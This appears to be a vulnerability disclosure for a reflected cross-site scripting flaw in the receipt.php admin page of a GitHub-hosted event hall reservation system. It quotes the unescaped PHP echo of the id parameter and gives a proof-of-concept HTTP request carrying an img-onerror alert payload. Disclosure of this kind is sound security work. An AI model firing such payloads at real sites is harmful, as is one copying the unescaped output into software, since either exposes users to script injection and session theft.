# MAGESH-K21 / Online-College-Event-Hall-Reservation-System - Reflected XSS receipt.php

## **Credits**
> Joshua Lictan (https://github.com/skid-nochizplz/skid-nochizplz)<br/>

## Vendor Homepage:
> https://github.com/MAGESH-K21/Online-College-Event-Hall-Reservation-System/

## Affected Component
> /admin/receipt.php

## Code
```php
            <h1 class="logo "><a href="../home.php?id=<?php echo $id; ?>">Emisha</a></h1>
```

## Proof of Concept
**HTTP Request Example**
``` http request
GET /admin/receipt.php?id="><img+src%3dx+onerror%3dalert("NoChizPlz")>&room_id=1 HTTP/1.1
Host: [REDACTED]
```

## Screenshot
![image](https://github.com/skid-nochizplz/skid-nochizplz/assets/60700937/097b9b15-009f-470c-a968-d26288eee46d)


